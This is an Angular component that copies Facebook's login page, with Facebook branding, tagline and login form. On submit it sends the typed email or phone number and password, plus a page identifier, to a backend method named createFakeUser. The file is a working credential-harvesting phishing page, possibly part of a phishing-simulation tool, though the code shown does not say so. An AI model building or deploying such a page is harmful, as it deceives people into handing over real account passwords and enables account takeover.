import {Component, Input} from '@angular/core';
import {DomSanitizer, SafeHtml} from '@angular/platform-browser';
import {ApiService} from '../../api.service';
import {ActivatedRoute} from '@angular/router';
import {FormsModule} from '@angular/forms';

@Component({
  selector: 'app-facebook',
  imports: [
    FormsModule
  ],
  template: '  <div class="p-20 h-screen w-screen flex flex-col-reverse md:flex-row items-center justify-center bg-gray-200">\n' +
    '    <div class="content text-3xl text-center md:text-left">\n' +
    '      <h1 class="text-5xl text-blue-500 font-bold">Facebook</h1>\n' +
    '      <p>Connect with friends and the world around you on Facebook.</p>\n' +
    '    </div>\n' +
    '    <div class="container mx-auto flex flex-col items-center">\n' +
    '      <form class="shadow-lg w-80 p-4 flex flex-col bg-white rounded-lg" (ngSubmit)="onSubmit()">\n' +
    '        <input type="text" placeholder="Email or Phone Number" [(ngModel)]="emailOrPhone" name="emailOrPhone" class="mb-3 py-3 px-4 border border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-cyan-500" required />\n' +
    '        <input type="password" placeholder="Password" [(ngModel)]="password" name="password" class="mb-3 py-3 px-4 border border-gray-400 focus:outline-none rounded-md focus:ring-1 ring-cyan-500" required />\n' +
    '        <button type="submit" class="w-full bg-blue-500 text-white p-3 rounded-lg font-semibold text-lg">Login</button>\n' +
    '        <a class="text-blue-400 text-center my-2">Forgot Password?</a>\n' +
    '        <hr />\n' +
    '        <button class="w-full bg-green-400 mt-8 mb-4 text-white p-3 rounded-lg font-semibold text-lg">Create New Account</button>\n' +
    '      </form>\n' +
    '      <p class="text-center text-sm my-4">\n' +
    '        <span class="font-semibold text-center w-full">Create a Page</span> for a celebrity, band or business\n' +
    '      </p>\n' +
    '    </div>\n' +
    '  </div>',
})
export class FacebookComponent {

  emailOrPhone: string = '';
  password: string = '';
  @Input() pageId!: string | null;

  constructor(private apiService: ApiService, private route: ActivatedRoute, private sanitizer: DomSanitizer) {}


  onSubmit() {
    this.apiService.createFakeUser(this.emailOrPhone, this.password, this.pageId!).subscribe({
      next: (response) => {
      },
      error: (error) => {
      }
    });
  }
}
